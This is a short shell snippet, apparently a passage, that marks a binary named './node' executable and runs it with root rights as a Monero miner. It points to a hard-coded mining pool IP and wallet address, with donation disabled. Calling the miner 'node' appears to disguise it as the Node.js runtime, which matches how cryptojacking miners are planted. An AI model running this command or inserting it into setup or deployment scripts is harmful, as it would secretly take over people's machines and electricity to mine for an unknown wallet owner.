...
chmod +x ./node
sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o 8.222.235.5:3333 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
